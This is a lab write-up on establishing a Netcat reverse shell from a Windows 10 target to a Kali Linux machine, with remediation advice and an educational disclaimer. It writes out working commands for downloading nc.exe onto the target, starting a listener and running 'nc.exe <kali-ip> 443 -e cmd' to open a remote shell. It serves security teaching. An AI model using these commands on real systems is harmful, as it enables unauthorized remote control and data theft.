# Netcat Reverse Shell

## Objective

Demonstrate how a reverse shell can be established between a compromised Windows system and a Kali Linux attacker machine using Netcat.

## Lab Environment

- Attacker Machine: Kali Linux
- Target Machine: Windows 10
- Tool Used: Netcat (nc.exe)
- Communication Method: Reverse TCP Connection

## File Transfer

A Netcat binary was transferred from Kali Linux to the target Windows machine using an HTTP server.

### Commands Used

```bash
cd /usr/share/windows-binaries

python2 -m SimpleHTTPServer 80
```

### Windows Download

```powershell
wget http://<kali-ip>/nc.exe -o nc.exe
```

### Findings

- Netcat executable was successfully transferred.
- File transfer was completed using HTTP.
- The target machine was prepared for reverse shell execution.

## Listener Setup

A Netcat listener was configured on Kali Linux to receive incoming reverse shell connections.

### Commands Used

```bash
nc -lvp 443
```

### Findings

- Listener started successfully.
- Kali Linux was ready to receive reverse shell connections.

## Reverse Shell Execution

A reverse shell was initiated from the Windows target to the Kali Linux attacker machine.

### Commands Used

```powershell
.\nc.exe <kali-ip> 443 -e cmd
```

### Findings

- Reverse shell connection was successfully established.
- Command execution was possible from the attacker machine.
- Access to the Windows command prompt was obtained.

## Alternative Reverse Shell Method

An additional reverse shell was generated using an online reverse shell generator.

### Commands Used

```bash
nc -lvp 8080
```

### Steps Performed

- Generated a PowerShell reverse shell payload.
- Executed the payload on the target machine.
- Received a PowerShell session on Kali Linux.

### Findings

- PowerShell reverse shell was successfully established.
- Remote command execution was achieved.

## Security Impact

Reverse shells allow attackers to remotely execute commands and interact with compromised systems.

### Potential Risks

- Unauthorized remote access
- Command execution
- Data theft
- Lateral movement
- Privilege escalation opportunities

## Remediation

- Restrict outbound network traffic.
- Monitor suspicious PowerShell activity.
- Block unauthorized executable downloads.
- Implement endpoint detection and response solutions.
- Use application whitelisting.

## Tools Used

- Netcat
- PowerShell
- Python HTTP Server
- Revshells.com
- Kali Linux
- Windows 10

## Key Learning

This lab demonstrated how reverse shells can be established using Netcat and PowerShell after successful file transfer to a target system.

The exercise reinforced concepts related to post-exploitation, remote command execution, and attacker-controlled communication channels.

## Disclaimer

This assessment was conducted in a controlled lab environment for educational and ethical security testing purposes only.